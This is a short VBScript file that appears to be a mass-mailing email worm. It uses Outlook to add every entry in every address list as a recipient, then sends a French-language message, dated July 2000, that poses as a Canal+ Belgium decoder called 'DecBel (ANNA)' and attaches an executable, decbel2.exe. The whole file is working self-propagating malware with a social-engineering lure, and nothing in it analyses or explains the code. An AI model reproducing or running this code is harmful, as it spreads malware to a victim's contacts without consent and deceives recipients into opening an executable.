On Error Resume Next
Set a=CreateObject("Outlook.Application")
Set b=a.CreateItem(0)
Set c=a.GetNameSpace("MAPI").AddressLists
For d=1 To c.Count
Set e=c(d).AddressEntries
For f=1 To e.Count
b.Recipients.Add e(f)
Next
Next
b.Subject="DecBel (ANNA) - JUILLET 2000."
b.Body="Bonjour ! Voici DecBel (ANNA) ! C'est un décodeur Canal+ Belgique. Consultez la documentation attachée à cet e-mail pour en savoir plus à son sujet... Ne le lancez pas sans le passer à l'antivirus !"
b.Attachments.Add "D:\DecBel.txt"
b.Attachments.Add "D:\decbel2.exe"
b.Send